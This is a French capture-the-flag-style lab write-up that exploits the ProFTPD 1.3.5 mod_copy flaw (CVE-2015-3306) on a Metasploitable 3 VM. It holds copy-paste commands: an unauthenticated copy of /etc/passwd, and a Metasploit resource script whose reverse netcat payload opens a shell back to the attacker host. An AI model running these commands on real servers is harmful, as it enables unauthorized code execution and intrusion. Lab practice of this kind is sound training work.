# Write-up — ProFTPD 1.3.5 mod_copy RCE (Metasploitable 3, port 21)

Cible : `172.28.128.3` · CVE-2015-3306 · Résultat : shell `www-data`.

Tout ce qui suit est copier-coller direct (testé en zsh), uniquement côté 🖥 Kali — pas de
manipulation nécessaire sur la VM pour ce service.

---

## 1. Recon

```bash
nmap -sC -sV -p 21 172.28.128.3
nmap -p 21 --script ftp-anon,ftp-syst 172.28.128.3
```
`ProFTPD 1.3.5` confirmé. Les scripts NSE anonymes ne remontent rien de notable.

Test de login anonyme (pour éliminer cette piste) :
```bash
ftp 172.28.128.3
# Name: anonymous
# Password: (vide)
```
→ `530 Login incorrect.` : compte anonyme fermé.

## 2. Identifier la vulnérabilité

```bash
searchsploit proftpd 1.3.5
```
```
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution        | linux/remote/36803.py
```
Confirme qu'un exploit existe, mais ces chemins sont ceux d'Exploit-DB, pas un module
Metasploit utilisable directement. Recherche dans `msfconsole` pour trouver ce module :

```bash
msfconsole -q -x "search proftpd; exit"
```
Plusieurs résultats pour d'autres versions de ProFTPD (1.2-1.3.0, 1.3.2rc3-1.3.3b,
1.3.3c...) ; un seul correspond à la version 1.3.5 exacte :
```
exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22  excellent  Yes  ProFTPD 1.3.5 Mod_Copy Command Execution
```
Reste à obtenir la CVE :

```bash
msfconsole -q -x "info exploit/unix/ftp/proftpd_modcopy_exec; exit"
```
```
References:
  https://nvd.nist.gov/vuln/detail/CVE-2015-3306
  https://www.exploit-db.com/exploits/36742
  http://bugs.proftpd.org/show_bug.cgi?id=4169
```

**CVE-2015-3306.** Le module `mod_copy` expose les commandes FTP `SITE CPFR`/`SITE CPTO`
**sans vérifier l'état d'authentification** de la session. N'importe quel client connecté
peut faire copier un fichier lisible par le process FTP vers n'importe quel chemin
accessible en écriture par ce même process — y compris le webroot Apache, d'où RCE possible
via un payload PHP.

## 3. Preuve de concept manuelle

🖥 Kali — aucun login nécessaire, les commandes passent sur une connexion FTP fraîche, non
authentifiée :
```bash
ftp -inv 172.28.128.3 <<'EOF'
quote SITE CPFR /etc/passwd
quote SITE CPTO /tmp/copie_passwd_test
quit
EOF
```
Résultat :
```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [172.28.128.3]
350 File or directory exists, ready for destination name
250 Copy successful
221 Goodbye.
```
→ `/etc/passwd` copié vers `/tmp/copie_passwd_test` sur la cible, sans authentification.
Confirme la faille avant de passer à l'outillage.

*(Codes FTP utiles : `3xx` = continuer/attend la suite, `5xx` = échec définitif.)*

## 4. Exploiter

🖥 Kali — via resource script (point d'attention : `SITEPATH` doit pointer sur le vrai
webroot, pas la valeur par défaut du module) :
```bash
cat > /tmp/ftp.rc << 'EOF'
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 172.28.128.3
set RPORT 80
set RPORT_FTP 21
set SITEPATH /var/www/html
set LHOST 172.28.128.1
set LPORT 4446
set PAYLOAD cmd/unix/reverse_netcat
exploit -z
sessions -l
sessions -i 1 -c id
sessions -i 1 -c whoami
sessions -i 1 -c "uname -a"
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/ftp.rc
```

⚠️ `SITEPATH /var/www` (défaut du module) échoue : `Failure copying PHP payload to website
path, directory not writable?` — le vrai webroot sur cette install est `/var/www/html`.

Résultat :
```
[*] Started reverse TCP handler on 172.28.128.1:4446
[*] 172.28.128.3:80 - Connected to FTP server
[*] 172.28.128.3:80 - Executing PHP payload /6UOi6.php
[+] 172.28.128.3:80 - Deleted /var/www/html/6UOi6.php
[*] Command shell session 1 opened (172.28.128.1:4446 -> 172.28.128.3:50777)
[-] 172.28.128.3:80 - Exploit aborted due to failure: unknown: ... Failure executing payload
[*] Exploit completed, but no session was created.

uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux
```

⚠️ **Piège reproductible à chaque run** : le message final `Exploit aborted ... Failure
executing payload` / `no session was created` est **trompeur** — la session s'ouvre bien
juste avant (`Command shell session 1 opened`), le module échoue seulement sur son nettoyage
HTTP après coup, indépendamment du succès réel du payload. Toujours vérifier avec `sessions
-l` plutôt que de se fier au message de fin.

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), étape 1 → 4
dans l'ordre. Aucune configuration persistante à refaire côté cible (contrairement à MS1 —
ce service est exploitable directement à chaque fois).

**Suite du parcours MS3 :** Samba/SMB (port 445).
